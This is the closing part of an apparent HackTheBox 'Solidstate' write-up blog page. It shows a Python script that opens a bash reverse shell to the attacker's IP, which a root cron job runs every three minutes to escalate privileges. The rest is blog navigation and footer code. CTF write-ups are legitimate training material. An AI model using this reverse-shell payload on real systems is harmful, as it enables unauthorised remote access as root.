+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">     os.system(&#39;bash -c &quot;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;10.10.16.69&#x2F;1234 0&gt;&amp;1&quot;&#39;)</span><br><span class="line">except:</span><br><span class="line">     sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>Go have a cup of tea.</p>
+<p><img src="https://images.atsud0.me/images/post/20210415-15:23:08-_EE4ktP_EE4ktP_EE4ktP_wqlPZG.png" alt="20210415-15:23:08-_EE4ktP_EE4ktP_EE4ktP_wqlPZG"></p>
+<p>if we use cron -l on root</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># m h  dom mon dow   command</span><br><span class="line">*&#x2F;3 * * * * python &#x2F;opt&#x2F;tmp.py</span><br></pre></td></tr></table></figure>
+
+<p>This script will run every three minutes</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a href="https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html" target="_blank" rel="noopener">Exploiting Apache James 2.3.2</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2021/04/15/HackTheBox-Solidstate/" title="HackTheBox-Solidstate">http://atsud0.me/2021/04/15/HackTheBox-Solidstate/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/POP3/" rel="tag"><i class="fa fa-tag"></i> POP3</a>
+              <a href="/tags/Apache-JAMES/" rel="tag"><i class="fa fa-tag"></i> Apache-JAMES</a>
+              <a href="/tags/rbash/" rel="tag"><i class="fa fa-tag"></i> rbash</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/13/GCP%E4%B8%8A%E4%BC%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%98%A0%E5%83%8F/" rel="prev" title="GCP上传自定义映像部署Kali">
+      <i class="fa fa-chevron-left"></i> GCP上传自定义映像部署Kali
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/15/HackTheBox-Node/" rel="next" title="HackTheBox-Node">
+      HackTheBox-Node <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01信息收集"><span class="nav-number">1.</span> <span class="nav-text">0x01信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NMAP"><span class="nav-number">1.1.</span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-25"><span class="nav-number">1.2.</span> <span class="nav-text">Port:25</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-4555"><span class="nav-number">1.3.</span> <span class="nav-text">Port:4555</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reset-Password-amp-Login-POP3-Check-Mails"><span class="nav-number">1.3.1.</span> <span class="nav-text">Reset Password &amp; Login POP3 Check Mails</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#james"><span class="nav-number">1.3.2.</span> <span class="nav-text">james</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#thomas"><span class="nav-number">1.3.3.</span> <span class="nav-text">thomas</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#john"><span class="nav-number">1.3.4.</span> <span class="nav-text">john</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mindy"><span class="nav-number">1.3.5.</span> <span class="nav-text">mindy</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit-id"><span class="nav-number">1.4.</span> <span class="nav-text">exploit-id</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-提权"><span class="nav-number">2.</span> <span class="nav-text">0x02 提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">3.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">150</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">191</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">461k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:59</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
